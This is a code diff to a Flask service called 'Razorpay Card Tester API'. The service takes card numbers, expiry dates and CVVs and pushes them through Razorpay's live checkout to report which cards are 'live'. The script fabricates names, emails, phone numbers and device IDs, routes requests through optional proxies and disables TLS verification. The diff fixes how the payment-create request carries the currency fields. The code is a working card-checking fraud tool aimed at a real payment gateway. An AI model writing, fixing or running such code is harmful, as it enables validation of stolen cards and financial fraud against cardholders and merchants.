@@ -1,7 +1,7 @@
-# app.py - Fixed currency_request_id from cross-border response
+# app.py - Remove dcc_currency_id, keep only valid fields
 from flask import Flask, request, jsonify
 import requests, re, json, time, random, string, secrets, hashlib, base64, urllib3
-from urllib.parse import quote, urlparse, parse_qs, unquote
+from urllib.parse import quote
 import os
 
 urllib3.disable_warnings()
@@ -47,7 +47,6 @@ def find_between(content, start, end):
         return ""
 
 def parse_proxy(proxy_string):
-    """Parse proxy string: host:port:user:pass or host:port"""
     if not proxy_string:
         return None
     parts = proxy_string.split(':')
@@ -60,7 +59,6 @@ def parse_proxy(proxy_string):
     return None
 
 def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
-    """Main function to test card on Razorpay"""
     result = {
         "status": "error",
         "message": "Unknown error",
@@ -70,7 +68,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
     }
     
     try:
-        # Generate random user data
         MEMBERSHIP_ID = generate_membership_id()
         MEMBER_NAME = generate_member_name()
         EMAIL = generate_email()
@@ -79,7 +76,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
         brand = get_card_brand(cc)
         year_full = int("20" + yy)
         
-        # Setup session with proxy if provided
         session = requests.Session()
         session.verify = False
         if proxy_string:
@@ -87,7 +83,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             if proxy_dict:
                 session.proxies = proxy_dict
         
-        # Generate device IDs
         h = hashlib.sha1(secrets.token_bytes(16)).hexdigest()
         ts = str(int(time.time() * 1000))
         rnd = str(random.randrange(10**8)).zfill(8)
@@ -218,7 +213,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             timeout=30
         )
         
-        # STEP 5: Cross border flows - CAPTURE THE RESPONSE
+        # STEP 5: Cross border flows - capture the currency_request_id
         headers_cb = {
             "Accept": "*/*", 
             "Content-type": "application/json", 
@@ -243,24 +238,20 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             timeout=30
         )
         
-        # Extract currency_request_id from cross-border response
+        # Extract currency_request_id - but don't use it if it causes errors
         currency_request_id = None
         try:
             cb_data = resp_cb.json()
-            # Try multiple paths to find the ID
             currency_request_id = (
                 cb_data.get('currency_request_id') or 
                 cb_data.get('data', {}).get('currency_request_id') or
                 cb_data.get('id') or
                 cb_data.get('request_id')
             )
-            # If still None, generate a fallback
-            if not currency_request_id:
-                currency_request_id = f"INR_{int(time.time())}_{random.randint(1000, 9999)}"
         except:
-            currency_request_id = f"INR_{int(time.time())}_{random.randint(1000, 9999)}"
+            pass
         
-        # STEP 6: Create payment - USE THE REAL currency_request_id
+        # STEP 6: Create payment - REMOVE dcc_currency_id
         headers_create = {
             'Accept': '*/*', 
             'Content-type': 'application/x-www-form-urlencoded', 
@@ -280,6 +271,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             separators=(',', ':')).encode()
         ).decode()
         
+        # Build base data WITHOUT dcc_currency_id
         data_create = {
             "user_risk_providers_token": token_create, 
             'notes[comment]': '', 
@@ -291,10 +283,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'contact': PHONE, 
             'email': EMAIL, 
             'currency': 'INR',
-            # FIX: Use the actual currency_request_id from cross-border response
-            'currency_request_id': currency_request_id,
-            'dcc_currency': 'INR',
-            'dcc_currency_id': currency_request_id,  # Sometimes they expect this
             '_[integration]': 'payment_pages',
             '_[checkout_id]': checkout_id, 
             '_[device.id]': rzp_device_id, 
@@ -324,6 +312,12 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             'save': '0',
         }
         
+        # Only add currency_request_id if it exists and is not None
+        if currency_request_id:
+            data_create['currency_request_id'] = currency_request_id
+            # Also add dcc_currency if we have the request ID
+            data_create['dcc_currency'] = 'INR'
+        
         resp_create = session.post(
             'https://api.razorpay.com/v1/standard_checkout/payments/create/checkout',
             params=params_create, 
@@ -336,9 +330,8 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
         # STEP 7: Parse response
         result["raw_json"] = {}
         
-        # Check if it's HTML (error page or 3DS)
+        # Check if it's HTML
         if 'text/html' in resp_create.headers.get('Content-Type', ''):
-            # Extract error from HTML if present
             error_match = re.search(r'var data = ({.*?});', resp_create.text, re.DOTALL)
             if error_match:
                 try:
@@ -351,12 +344,10 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
                 except:
                     pass
             
-            # If no error found, treat as 3DS
             result["status"] = "3ds_required"
             result["message"] = "3DS authentication required - card is live"
             result["raw_json"] = {"redirect": True, "message": "3DS OTP required"}
             
-            # Try to extract redirect URL
             redirect_match = re.search(r'window\.location\.href\s*=\s*"([^"]+)"', resp_create.text)
             if redirect_match:
                 result["redirect_url"] = redirect_match.group(1)
@@ -374,24 +365,19 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
             error_desc = pay_json.get("error_description", "")
             error_code = pay_json.get("error_code", "")
             
-            # Check for success
             if payment_id and status in ["authorized", "captured", "success"]:
                 result["status"] = "success"
                 result["message"] = "Payment successful"
                 result["raw_json"]["payment_id"] = payment_id
                 return result
             
-            # Check for specific errors
             if error_desc or error_code:
                 result["status"] = "declined"
                 result["message"] = f"Payment declined: {error_desc if error_desc else error_code}"
-                
-                # Add order and payment IDs if available
                 if pay_json.get("metadata", {}).get("order_id"):
                     result["raw_json"]["metadata"] = pay_json.get("metadata")
                 return result
             
-            # Check for redirect in JSON
             if pay_json.get("redirect") is True or pay_json.get("type") == "redirect":
                 result["status"] = "3ds_required"
                 result["message"] = "3DS authentication required"
@@ -400,7 +386,6 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
                     result["raw_json"]["redirect_url"] = pay_json["request"]["url"]
                 return result
             
-            # Unknown response
             result["status"] = "unknown"
             result["message"] = "Unknown response from gateway"
             
@@ -422,7 +407,7 @@ def test_card_on_razorpay(cc, mm, yy, cvv, proxy_string=None):
 def home():
     return jsonify({
         "service": "Razorpay Card Tester API",
-        "version": "1.4",
+        "version": "1.5",
         "endpoints": {
             "test": "/test?cc=xxxx|mm|yy|cvv&site=url&proxy=host:port:user:pass"
         },
@@ -432,7 +417,6 @@ def home():
 
 @app.route('/test', methods=['GET'])
 def test_endpoint():
-    """Main endpoint for testing cards"""
     cc_param = request.args.get('cc')
     site_param = request.args.get('site')
     proxy_param = request.args.get('proxy')
